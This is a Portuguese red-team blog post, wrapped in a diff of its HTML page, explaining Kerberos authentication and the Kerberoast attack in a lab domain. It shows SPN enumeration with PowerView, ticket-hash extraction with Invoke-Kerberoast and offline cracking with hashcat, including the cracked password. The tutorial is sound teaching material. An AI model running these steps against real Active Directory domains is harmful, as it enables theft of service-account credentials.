@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Kerberos &amp; Kerberoast | tuxtrack</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Kerberos &amp; Kerberoast" />
+<meta name="author" content="tuxtrack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do NT LAN Manager (NTML) Challenge-Response." />
+<meta property="og:description" content="O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do NT LAN Manager (NTML) Challenge-Response." />
+<link rel="canonical" href="http://localhost:4000/2020/02/13/kerberos101.html" />
+<meta property="og:url" content="http://localhost:4000/2020/02/13/kerberos101.html" />
+<meta property="og:site_name" content="tuxtrack" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-13T09:55:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Kerberos &amp; Kerberoast" />
+<script type="application/ld+json">
+{"url":"http://localhost:4000/2020/02/13/kerberos101.html","headline":"Kerberos &amp; Kerberoast","dateModified":"2020-02-13T09:55:00-03:00","datePublished":"2020-02-13T09:55:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/02/13/kerberos101.html"},"author":{"@type":"Person","name":"tuxtrack"},"description":"O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do NT LAN Manager (NTML) Challenge-Response.","@type":"BlogPosting","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="tuxtrack" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">tuxtrack<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/tuxtrack"><i class="fab fa-twitter-square"></i></a><a class="color-red-hover" href="https://instagram.com/tuxtrack"><i class="fab fa-instagram"></i></a><a class="color-purple-hover" href="https://github.com/tuxtrack"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://github.com/tuxtrack.png
+        " class="author-avatar" alt="Avatar" />
+    
+“The only person in computing that is paid to actually understand the system from top to bottom is the attacker! Everybody else usually gets paid to do their parts.”  Halvar Flake
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Kerberos & Kerberoast</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/KERBEROS/">KERBEROS</a>
+      
+      <a class="tag" href="/tag/ACTIVE DIRECTORY/">ACTIVE DIRECTORY</a>
+      
+      <a class="tag" href="/tag/REDTEAM/">REDTEAM</a>
+      
+      <a class="tag" href="/tag/WINDOWS/">WINDOWS</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 13 Feb 2020</div>
+  
+  <p>O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT LAN Manager (NTML) Challenge-Response</a>.</p>
+
+<blockquote>
+  <p>Kerberos é um protocolo de autenticação usado para verificar a identidade de um usuário ou host. <a href="https://docs.microsoft.com/pt-br/windows-server/security/kerberos/kerberos-authentication-overview">Microsoft</a></p>
+</blockquote>
+
+<h3 id="funcionamento-do-processo-de-autenticação">Funcionamento do processo de autenticação</h3>
+
+<ul>
+  <li>No momento em que o usuário faz logon utilizando credenciais de um domínio, o Local Security Authority Subsystem Service (LSASS) armazena o hash da sua conta. O LSASS armazena credenciais na memória em nome de usuários com sessões ativas do Windows.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/01.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>O TGT (Ticket-Granting-Ticket) será requisitado ao KDC (Key Distribution Center) service presente no DC (Domain Controller), utilizando algum dos algoritimos de criptografia (RC4_HMAC, DES_CBC_MD5, 128AES_HMAC, 256AES_HMAC…) baseando-se no <a href="https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/active-directory-functional-levels">Domain Level Function</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/02.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>Ocorrendo a validação da autenticação da conta, o Domain Controller retorna o TGT assinado com o hash da conta de serviço krbtgt (Key Distribution Center Service Account). krbtgt é a conta utilizada para criptografar e assinar todos os tickets do domínio, logo, se o hash da conta é comprometido, um atacante pode forjar tickets (Golden Tickets).</li>
+</ul>
+
+<p>Através do cmdlet <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> do powershell, podemos obter informações sobre a conta krbtgt utilizando a classe <a href="https://wutils.com/wmi/root/directory/ldap/ads_account/">ads_account</a> presente no NameSpace <a href="https://wutils.com/wmi/root/directory/ldap/default.html">ROOT\directory\LDAP</a>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\tuxtrack&gt;</span><span class="w"> </span>Get-WmiObject <span class="nt">-Namespace</span> <span class="s2">"ROOT</span><span class="se">\d</span><span class="s2">irectory</span><span class="se">\L</span><span class="s2">DAP"</span> <span class="nt">-Class</span> ads_account <span class="nt">-Filter</span> <span class="s2">"ds_user='krbtgt'"</span>
+<span class="go">
+DS_Name                 : krbtgt
+ADSIPath                : LDAP://CN=krbtgt,CN=Users,DC=hnr,DC=local
+DS_description          : {Key Distribution Center Service Account}
+DS_servicePrincipalName : {kadmin/changepw}
+DS_memberOf             : {CN=Denied RODC Password Replication Group,CN=Users,DC=hnr,DC=local}
+</span></code></pre></div></div>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/03.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>Para que o usuário possa utilizar algum serviço do domínio, o processo de autorização se dá através do envio do TGT ao Domain Controller para a requisição do Service Ticket ou TGS (Ticket-Granting-Service), ex.: MSSqlSvc/SQL.domain.com. Durante esse processo o atacante pode especificar qual criptografia ele suporta <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-configure-encryption-types-allowed-for-kerberos">(RC4_HMAC, AES256_CTS_HMAC_SHA1_96, etc)</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/04.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>O Domain Controller retorna o Service Ticket (TGS) correspondente ao serviço solicitado, após identificar qual conta de usuário/computador possui o serviço solicitado. O ticket retornado é criptografado com o hash da conta de usuário/computador correspondente ao serviço.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/05.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>O Service Ticket (TGS) é apresentado ao server que armazena o serviço solicitado, o servidor descriptografa o hash utilizando seu próprio hash (Hash esse que foi utilizado pelo DC para criptografar o TGS no passo anterior) e o acesso ao serviço é concedido.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/06.png" alt="" /></p>
+
+<hr />
+
+<h3 id="kerberoast">Kerberoast</h3>
+
+<p>Kerberoast é o nome dado ao ataque no processo de assinatura de um Service Ticket. TGS’s tickets são criptografados com hash NTLM da conta de domínio utilizada como conta de serviço que utilize o kerberos para autenticação, no caso abaixo, a conta sqlserver para o SPN MSSQLSvc/SQL.hnr.local (TGS-REP). O acesso ao serviço não é necessário para se ter acesso ao ticket de serviço, já que como mostrado anteriormente, para requisitar um TGS, o atacante necessita apenas do TGT (TGS-REQ).</p>
+
+<blockquote>
+  <p>SPN - A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name. <a href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">MSDN</a></p>
+</blockquote>
+
+<p>É necessário ao atacante listar todos os SPN’s presentes no domínio. Uma das formas de enumerá-los é utilizando o módulo Get-NetUser do <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, projeto que reúne diversos recursos de enumeração em ambientes Microsoft Active Directory, ou poderíamos utilizar a ferramenta <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v%3Dws.11)">setspn.exe</a> seguindo do argumento “-L ServerName”, presente por padrão nos sistemas operacionais Microsoft Windows.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\charris\Desktop&gt;</span><span class="w"> </span>Get-NetUser <span class="nt">-SPN</span> <span class="nt">-Domain</span> hnr.local                                                                                                                                      
+<span class="go">
+logoncount                    : 0
+badpasswordtime               : 12/31/1600 10:00:00 PM
+description                   : Key Distribution Center Service Account
+distinguishedname             : CN=krbtgt,CN=Users,DC=hnr,DC=local
+objectclass                   : {top, person, organizationalPerson, user}
+name                          : krbtgt
+primarygroupid                : 513
+objectsid                     : S-1-5-21-45967290-1955130809-1078885739-502
+whenchanged                   : 2/11/2020 3:41:33 AM
+logonhours                    : {255, 255, 255, 255...}
+admincount                    : 1
+codepage                      : 0
+samaccounttype                : 805306368
+showinadvancedviewonly        : True
+accountexpires                : 0
+cn                            : krbtgt
+adspath                       : LDAP://GOKU.hnr.local/CN=krbtgt,CN=Users,DC=hnr,DC=local
+instancetype                  : 4
+objectguid                    : 33883e3e-0893-47f3-bff4-df5ebbd1a7eb
+lastlogon                     : 12/31/1600 10:00:00 PM
+lastlogoff                    : 12/31/1600 10:00:00 PM
+samaccountname                : krbtgt
+objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=hnr,DC=local
+dscorepropagationdata         : {2/10/2020 10:56:16 AM, 2/10/2020 10:29:34 AM, 1/1/1601 12:04:16 AM}
+serviceprincipalname          : kadmin/changepw
+memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=hnr,DC=local
+whencreated                   : 2/10/2020 10:29:34 AM
+iscriticalsystemobject        : True
+badpwdcount                   : 0
+useraccountcontrol            : 514
+usncreated                    : 12324
+countrycode                   : 0
+pwdlastset                    : 2/11/2020 12:41:33 AM
+msds-supportedencryptiontypes : 0
+usnchanged                    : 20571
+
+logoncount               : 20
+badpasswordtime          : 2/12/2020 3:51:51 PM
+distinguishedname        : CN=SQLServer,CN=Managed Service Accounts,DC=hnr,DC=local
+objectclass              : {top, person, organizationalPerson, user}
+displayname              : SQLServer
+lastlogontimestamp       : 2/12/2020 3:52:01 PM
+userprincipalname        : sqlserver@hnr.local
+name                     : SQLServer
+objectsid                : S-1-5-21-45967290-1955130809-1078885739-1602
+samaccountname           : sqlserver
+codepage                 : 0
+samaccounttype           : 805306368
+whenchanged              : 2/12/2020 11:10:04 PM
+accountexpires           : 9223372036854775807
+countrycode              : 0
+adspath                  : LDAP://GOKU.hnr.local/CN=SQLServer,CN=Managed Service Accounts,DC=hnr,DC=local
+instancetype             : 4
+usncreated               : 28785
+objectguid               : 30de1078-1fed-40af-81cc-e79f0b7537f0
+lastlogoff               : 12/31/1600 10:00:00 PM
+msds-allowedtodelegateto : MSSQLSvc/SQL.hnr.local
+objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=hnr,DC=local
+dscorepropagationdata    : {2/12/2020 6:06:13 PM, 1/1/1601 12:00:00 AM}
+serviceprincipalname     : {MSSQLSvc/SQL.hnr.local:1433, MSSQLSvc/SQL.hnr.local:SQLEXPRESS, MSSQLSvc/:1433, MSSQLSvc/SQL.hnr.local}
+givenname                : SQLServer
+lastlogon                : 2/12/2020 6:13:45 PM
+badpwdcount              : 0
+cn                       : SQLServer
+useraccountcontrol       : 512
+whencreated              : 2/12/2020 6:06:13 PM
+primarygroupid           : 513
+pwdlastset               : 2/12/2020 8:10:04 PM
+usnchanged               : 32844
+</span></code></pre></div></div>
+<p>Após a enumeração, como informado anteriormente, o atacante de posse do TGT precisa requisitar o TGS para o serviço alvo assinado pela conta do usuário/computador correspondente. A extração do ticket criptografado do TGS-REP, pode ser executada utilizando o módulo <a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast</a> presente no toolkit <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\charris\Desktop&gt;</span><span class="w"> </span>Invoke-Kerberoast <span class="nt">-domain</span> hnr.local <span class="nt">-OutputFormat</span> Hashcat                                                                                                               
+<span class="go">
+TicketByteHexStream  :
+</span><span class="gp">Hash                 : $</span>krb5tgs<span class="nv">$23$*</span>sqlserver<span class="nv">$hnr</span>.local<span class="nv">$MSSQLSvc</span>/SQL.hnr.local:1433<span class="k">*</span><span class="nv">$6EB0AF7AF18FE1BD3B1033840C3848CB$58E8E31B0086B724DA67DFA11BC6C2A6B36399DFD60A6DD935CD850BE8C9365821A04A6F4F113B</span>
+<span class="go">                       6CC178A80467DCB6AFE6DA14F2A8286BD91A079A795B77084DBDD876323FE5A9130E215E3F8D2E763D9F21840091336DCB315082C29BDC6A3E34A94DB26A8DDA2E007DF3DE085A1030FDAC24AF832C100FC7BBB6D00EE
+                       CC8A375C7408EA858BBF746A0754BF58DE9D39646636F6B228D97DEBED70960CCBC1B6A6EC01936C9744CC6D43E38518AA24A84E3353E9AA3DB31E6FFA8D15917F10BF97E1909D70276F9B0C33ACB1B05DE912DDF9BE6
+                       DA50BD35CE3A295AF29B8D530F2EAEDDAEFDC34A8BC0C05C3C592B4D1A5F296C20B9A37B7B08F4D19955C08A53BC80C8DDEE168D26E726FAD832355DF45583B78D70C8EE676B6838D155A864763667FFF2048D2BD4D35
+                       F34EF06BD7E387EDC08402D8703CE635710B1A33E352225A680FE15F2F1F6D3B26D91B1C7616F1B558759EF82B4350E846D7245CAD30D65C1CDB39E2DBC34C8E1F9ECC4744BF75302EBADEA2BF8B40BB234307916CAC4
+                       78A89A42062908F41FA1241B1489AE45731E2AEE521C5B56805C2C2152E117C42AC1BAE2159806F8F42D9463D7B2ED710F5BA85FC60D0988DCA6C70551DC95F2E2248B2F1E287CD156FB9B13356E9EE797D9FF17E0231
+                       BE8406669AD7EEC934CB17F863BFB7DC545E0106BFE09DF621F9922C514D9242E07F2395F3286D78ADE0AAC6EC18D8CB3414018B9D82ECB39B1258805D0953AA564179BD60F2E8361671081304AEB06BB5D53F48F87BE
+                       416FB203F14F835C841919E542D0C381D06EC1ACA47EDB88950EDFE7D6BAC6EA91FD806F21431A4B19179D34FCEF03D4774EFEA272FEDDC6D6BCBAD9E8E366DF8ECF9DB571857978DEF90727E92E49AA1795A5EFE7C7B
+                       A57BD02FA28AD95DD9639EC5BDE3F3C229AC94AE20F574186334132084A94BBB0AC963E070AB9D5BF33D57EDAF43B653736FECA62B4C5414C5E68357527C0AB1E3C1F8B9306601DC3DA93D573C880642965F9AC587CB5
+                       052ABF1E667D418CC3AB0B7D236D8B33A45FB328C094603C4388BCE467DD2EEA580130564541C31AE3CA1DE10F244DC05F4FA8F405A5C1B6D1C5C79A885C2BCD1A505989B70F005884BD639170E3C1147823ECC9EFFB0
+                       A03C2B718595719DB8AD60A74AE06A92CB917B05E43E09D3993A5BACA5F656072294B9ECC64BC028C685358455935F7FC96E76A81E4771CA0BDDCB23346708B0B4EFE6929050846B6404D784A989F5A29EEA422E34225
+                       44DDC77FB1B191249E2D7D19405F094A2934F5C1BF7DDCA532236C77EA98E76BB47F8391F39DECC3E64BF9667B8D28491CF09EBC28A0AF17E33C88E02BAD1346396BE2E2D75A079218ED683A2EB466B34EF5C274FE3A8
+                       62BD89A260088C356201934C783D4166827F30DA0DAF4D2162DB215362BD299CFBE5B3D1855C1E70CFDEA5C5024FC4B6090B9037194F38EF884DCE5FE8DA037638EF2F11B93C8382D282BD0D761F697795D7AD38D9B75
+                       198AF91F92E0D2A11595F3E6D63113165A8849DD8150284312D3AFB6047F88F5C88F76E1
+SamAccountName       : sqlserver
+DistinguishedName    : CN=SQLServer,CN=Managed Service Accounts,DC=hnr,DC=local
+ServicePrincipalName : MSSQLSvc/SQL.hnr.local:1433
+</span></code></pre></div></div>
+<p>Com a extração do hash, o ataque se dá offline através da tentativa de descoberta da credencial utilizando wordlists em um processo de “quebra” do hash mencionado. Para exemplificar, foi utilizada como ferramenta o <a href="https://hashcat.net/hashcat/">HashCat</a>.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">hashcat-5.1.0 ./hashcat64.bin -a 0 -m 13100 hash.txt ~/tools/wordlist/br-wordlist.txt
+hashcat (v5.1.0) starting...
+
+</span><span class="gp">OpenCL Platform #</span>1: NVIDIA Corporation
+<span class="go">======================================
+</span><span class="gp">* Device #</span>1: GeForce GPU, 500/2000 MB allocatable, 5MCU
+<span class="go">
+</span><span class="gp">Hashes: 1 digests;</span><span class="w"> </span>1 unique digests, 1 unique salts
+<span class="go">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Watchdog: Temperature abort trigger set to 90c
+
+Dictionary cache built:
+* Filename..: /home/tuxtrack/tools/wordlist/br-wordlist.txt
+* Passwords.: 73551
+* Bytes.....: 596942
+* Keyspace..: 73551
+* Runtime...: 0 secs
+
+</span><span class="gp">$</span>krb5tgs<span class="nv">$23$*</span>sqlserver<span class="nv">$hnr</span>.local<span class="nv">$MSSQLSvc</span>/SQL.hnr.local:1433<span class="k">*</span><span class="nv">$b9aa930a4701972a30a499e63dc</span>
+<span class="gp">bf5bb$</span>61c1e1610ac22090f167efc415053ced20a33f8c2eafa63d4273c01bd5bcb17915adfc5978900e52735
+<span class="go">a45fbee87cf87714eef994e0c7141727bde132b74090ba5689a7eb810dd36a7b4c9dca9bde985b4bfda061d4e
+79bec757efe5776b3b448928f691ada4d5823e667ac12c04036b7c59b4cc5d6c73c6b90c41a665b75fc1290b1
+24a237ff85755d8f32e16554355e376fad9c8bfbe148220a378a2a2c64f2636bce82640050826d1b70754d682
+eaa5ef239bd51422a7f47f92f979478407af84db5c4e750084d698a2a86726b38cd97a89e5996105cced2d5bc
+a96c08c839ec1129e71bbbd6bbe5072afeccd0a54a1bab854c5542183802a5ced29806de77615f9ce45d3dc5c
+00ee84c27104f46aa219f36103f4ffec0f2144d7d46ff2f9466b6bba33fff5cd353b8a236f6e972e62f707857
+1920320c8cf6279899c3304194e55dfa9053d5c3b6a67d122de88fab9475532643ba0ce5e3fdf3b2136439c33
+a722fc040aa9b04ca4c3033c2d766dfa76d9f43680d28f74aa7835df74523cf30fc633fb6e63b1ce48c855a8b
+5888ca3f054106e6c9aa7fb216ec32673e58091f587e86c2c84b82bcae0406a762b0fa0c5fa7c27245df3789b
+8920d876d2fa0c6ba762cf9e8c6ed754ddb67370073d761c4ab9e71140ce56ad0645050cd0e164812040a2b16
+d0649ca51b8b63518092a5d2810fc103cc1c7288f18c0e524fd2e050724e8b2b81fc957b704eb7b05f712f5bf
+ee43c46261a2f6c6204a6178c694f662d409452dd823fa92b2a2a5e2d9cb00410007ee832d7631b2a5b3744e8
+8409e4f4cf24b872d0c724d2733fa37b581cbfd18bf068f7518be633200e43fb38b32ecb1400bdf2f25c8190a
+55df5d126e2d60fb445e58ee82df35b5a36c1dbf7915a42eac048235144086c8e75694068e1fc1a619990a545
+1be5c7d9f1b3b3e21ed3a38c96c974dcd030cb5b4a7bd1c1fcfc91c75e0a025b4e965603251a319ee5e56706b
+ad97a827c2dff3403202e4dcb25618cb488e04193a80281bd64f96d6efb8c89285320cd3749ee651c5096a073
+3e39a2a603ea681ba0c423393f7326cdd2ee206f565f1084627e7d27db1327c4b1413858a372d377a412a1f70
+5b22dbe13ab6df19430c1a82b0678467c964982ad192d6e6a00f86115925c82e6a50d7cf35450b06283d1c51d
+02d926f23bf99b24eb5557f019720f1eb4c11cd4915aab29c0afb978c1233bda567381dc9ba6ccc84d7b7db27
+fd78a06b40da4acb6fc6094befbe6b18926ae821ee728347a4914bddda945c2947aced4a2a187b0357b9d5953
+f363462f0726f332b3761b112b540f1a01402e60dea0d0485f36194ae17d8cfec6acb6229efee662d4187f710
+2393488d31ff6a5d4c40262274fb4a5ea1c7d76638c0b1ba82f62c841de519e0a2955b82eea2f70fae5dd30ec
+007130caed823aa6f84fa97c227347a871dceefaa4d0860a82151c0a049b52332c550732c95a7c7ed54c0aa6a
+1033831a4598b6bd0069b34e6bfd11ecc5ec8dca0a0e9d89dda1d3056e240beeaa98ce0645aeb105194382fb0
+</span><span class="gp">68e2ccb:P@$</span>sword
+<span class="go">                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: Kerberos 5 TGS-REP etype 23
+</span><span class="gp">Hash.Target......: $</span>krb5tgs<span class="nv">$23$*</span>sqlserver<span class="nv">$hnr</span>.local<span class="nv">$MSSQLSvc</span>/SQL.hnr.l...8e2ccb
+<span class="go">Time.Started.....: Thu Feb 13 11:07:38 2020 (0 secs)
+Time.Estimated...: Thu Feb 13 11:07:38 2020 (0 secs)
+Guess.Base.......: File (/home/tuxtrack/tools/wordlist/br-wordlist.txt)
+Guess.Queue......: 1/1 (100.00%)
+</span><span class="gp">Speed.#</span>1.........:   716.3 kH/s <span class="o">(</span>9.92ms<span class="o">)</span> @ Accel:256 Loops:1 Thr:64 Vec:1
+<span class="go">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 73551/73551 (100.00%)
+Rejected.........: 0/73551 (0.00%)
+Restore.Point....: 0/73551 (0.00%)
+</span><span class="gp">Restore.Sub.#</span>1...: Salt:0 Amplifier:0-1 Iteration:0-1
+<span class="gp">Candidates.#</span>1....: Aarao -&gt; integros
+<span class="gp">Hardware.Mon.#</span>1..: Temp: 49c Util: 33% Core:1019MHz Mem:2505MHz Bus:16
+<span class="go">
+Started: Thu Feb 13 11:07:28 2020
+Stopped: Thu Feb 13 11:07:39 2020
+</span></code></pre></div></div>
+<p>Havendo sucesso, a senha é descoberta e o atacante poderá ter acesso a conta de serviço.</p>
+
+<p>Bom, é isso ai!! Caso eu tenha errado em algo, ou alguma explicação precise ser melhorada, por favor entrem em contato comigo via twitter @tuxtrack ou por email: tuxtrack@hacknroll.com.</p>
+
+<p>Happy Hacking and HackN’Roll \m/</p>
+
+<p>References:</p>
+
+<ul>
+  <li><a href="https://social.technet.microsoft.com/wiki/contents/articles/4209.kerberos-survival-guide.aspx">Kerberos Survival Guide</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt1/">Mubix Kerberoast Part 01</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt2/">Mubix Kerberoast Part 02</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt3/">Mubix Kerberoast Part 03</a></li>
+</ul>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2020/02/13/kerberos101.html';
+     this.page.identifier = '/2020/02/13/kerberos101';
+     this.page.title = 'Kerberos & Kerberoast';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//tuxtrack.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2020/05/09/k&d.html">
+            Kerberos & Delegation
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/03/13/dacl.html">
+            DACL & ACE'S ON ACTIVE DIRECTORY
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2020/03/02/g&s.html">
+            Golden & Silver
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/acl/" class="set-1">ACL</a> <a href="/tag/active-directory/" class="set-5">ACTIVE DIRECTORY</a> <a href="/tag/delegation/" class="set-1">DELEGATION</a> <a href="/tag/hello-world/" class="set-1">HELLO WORLD</a> <a href="/tag/kerberos/" class="set-2">KERBEROS</a> <a href="/tag/redteam/" class="set-5">REDTEAM</a> <a href="/tag/windows/" class="set-5">WINDOWS</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
